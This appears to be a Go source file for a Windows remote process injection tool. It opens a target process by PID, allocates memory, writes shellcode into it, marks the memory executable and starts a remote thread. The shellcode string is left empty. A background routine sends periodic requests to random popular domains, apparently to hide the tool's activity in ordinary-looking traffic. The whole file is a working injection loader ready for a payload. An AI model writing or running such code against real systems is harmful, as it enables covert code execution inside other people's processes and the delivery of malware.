package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var alexaDomains = []string{
	"aol.com", "amazon.com", "apple.com", "baidu.com", "bing.com", "blogspot.com", "cnn.com", "comcast.net", "facebook.com", "google.com",
	"google.co.in", "google.co.jp", "google.co.uk", "google.co.kr", "google.co.za", "google.com.au", "google.com.br", "google.com.mx", "google.com.tr",
	"google.de", "google.fr", "google.it", "google.ru", "google.co.nz", "google.co.th", "google.co.id", "google.com.hk", "google.com.sa", "google.com.ar",
	"youtube.com", "wikipedia.org", "qq.com", "taobao.com", "tmall.com", "jd.com", "baidu.com", "taobao.com", "tmall.com", "jd.com",
	"weibo.com", "sina.com.cn", "sohu.com", "qq.com", "tencent.com", "qq.com", "tencent.com", "qq.com", "tencent.com", "qq.com",
}

func main() {
	verbose := flag.Bool("verbose", false, "")
	debug := flag.Bool("debug", false, "")
	pid := flag.Int("pid", 0, "")
	flag.Parse()
	go checkDomains()
	shellcode, errShellcode := hex.DecodeString("")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Getting a handle to Process ID (PID) %d...", *pid))
	}
	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*pid))
	if errOpenProcess != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to process %d", *pid))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", *pid))
	}
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}
	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", *pid))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", *pid))
	}
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", *pid))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", *pid))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != nil {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *pid))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Call CreateRemoteThreadEx on PID %d...", *pid))
	}
	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[+]Successfully create a remote thread in PID %d", *pid))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling CloseHandle on PID %d...", *pid))
	}
	errCloseHandle := windows.CloseHandle(pHandle)
	if errCloseHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", *pid))
	}
}

func checkDomains() {
	rand.Seed(time.Now().UnixNano())
	for range time.Tick(5 * time.Minute) {
		rand.Seed(time.Now().UnixNano())
		for i := 0; i < 3; i++ {
			rand.Seed(time.Now().UnixNano())
			domain := alexaDomains[rand.Intn(len(alexaDomains))]
			go func(d string) {
				resp, err := http.Head(fmt.Sprintf("https://%s", d))
				if err != nil {
					log.Printf("[!]Failed to request %s: %v", d, err)
					return
				}
				defer resp.Body.Close()
				log.Printf("[+]Successfully requested %s", d)
			}(domain)
		}
	}
}